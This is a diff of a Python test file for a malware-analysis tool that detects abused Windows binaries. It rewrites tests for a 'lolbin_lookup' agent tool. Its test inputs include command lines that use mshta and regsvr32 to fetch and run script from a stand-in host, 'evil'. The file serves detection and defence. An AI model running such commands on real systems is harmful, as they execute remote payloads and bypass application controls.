@@ -6,12 +6,8 @@ ubiquitous and benign, so mere presence must never be flagged.
 
 from __future__ import annotations
 
-from maljan.analysis.lolbin_layer import build_lolbin_isr, classify_lolbin
-from maljan.analysis.ttp_cascade import TTPCascadeEngine
-
-
-def _report(*command_lines: str) -> dict:
-    return {"behavior": {"processes": [{"command_line": c} for c in command_lines]}}
+from maljan.analysis.lolbin_layer import classify_lolbin
+from maljan.tools.knowledge import lolbin_lookup
 
 
 class TestClassifyLolbin:
@@ -50,35 +46,24 @@ class TestClassifyLolbin:
         assert classify_lolbin(r"C:\Windows\System32\notepad.exe foo.txt") is None
 
 
-class TestBuildLolbinIsr:
-    def test_builds_isr_with_dynamic_domain_and_windows_platform(self) -> None:
-        isr = build_lolbin_isr(_report("mshta http://evil/x.hta"))
-        assert isr is not None
-        assert isr.domain == "dynamic"
-        assert isr.agent_id == "lolbin"
-        assert len(isr.claims) == 1
-        assert isr.claims[0].technique_id == "T1218.005"
-        assert isr.claims[0].rule_platforms == ["windows"]
+class TestLolbinLookup:
+    """The tool an agent actually calls. It reports hits and asserts nothing."""
 
-    def test_dedupes_identical_command_lines(self) -> None:
-        isr = build_lolbin_isr(_report("mshta http://evil/x.hta", "mshta http://evil/x.hta"))
-        assert isr is not None
-        assert len(isr.claims) == 1
+    def test_a_hit_names_the_binary_and_the_technique(self) -> None:
+        answer = lolbin_lookup(["mshta http://evil/x.hta"])
+        assert answer["checked"] == 1
+        assert answer["hits"] == [
+            {
+                "binary": "mshta",
+                "technique_id": "T1218.005",
+                "pattern": "mshta http://evil/x.hta",
+            }
+        ]
 
-    def test_none_when_no_suspicious_lolbin(self) -> None:
-        assert build_lolbin_isr(_report("rundll32 shell32.dll,Control_RunDLL")) is None
-        assert build_lolbin_isr({}) is None
-        assert build_lolbin_isr(None) is None
+    def test_a_benign_invocation_produces_no_hit(self) -> None:
+        answer = lolbin_lookup(["rundll32 shell32.dll,Control_RunDLL", "   "])
+        assert answer["hits"] == []
 
-
-class TestCascadeIntegration:
-    def test_lolbin_technique_surfaces_on_windows_and_drops_on_linux(self) -> None:
-        isr = build_lolbin_isr(_report("regsvr32 /i:http://evil/a.sct scrobj.dll"))
-        assert isr is not None
-        reports = {"lolbin": isr}
-
-        win = TTPCascadeEngine().compute(reports, sample_platform="windows")
-        assert any(r.technique_id == "T1218.010" for r in win.results)
-
-        lin = TTPCascadeEngine().compute(reports, sample_platform="linux")
-        assert not any(r.technique_id == "T1218.010" for r in lin.results)
+    def test_no_confidence_number_is_invented_for_a_match(self) -> None:
+        hit = lolbin_lookup(["regsvr32 /i:http://evil/a.sct scrobj.dll"])["hits"][0]
+        assert "confidence" not in hit
